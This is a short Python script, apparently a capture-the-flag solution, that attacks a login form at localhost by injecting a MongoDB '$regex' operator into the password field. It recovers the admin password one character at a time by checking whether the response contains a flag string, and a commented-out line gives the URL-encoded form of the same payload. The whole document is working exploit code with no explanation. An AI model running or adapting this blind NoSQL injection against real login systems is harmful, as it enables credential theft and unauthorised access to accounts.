#!/usr/local/bin/python3

import requests
import string
import warnings

warnings.filterwarnings("ignore")

url = 'http://localhost:8080/login'
username = 'admin'
password = ''

while True:
    for c in string.printable:
        if c not in ['*', '+', '.', '?', '|', '#', '&', '$']:
            payload = {"username": "{}".format(username), "password": {'$regex': "^{}".format(password + c)}}
            # payload='?username=%s&password[$regex]=^%s' % (username, password + c)
            r = requests.post(url, json=payload, verify=False)
            if 'axactf' in r.text:
                print("Found one more char : {}".format(password+c))
                password += c
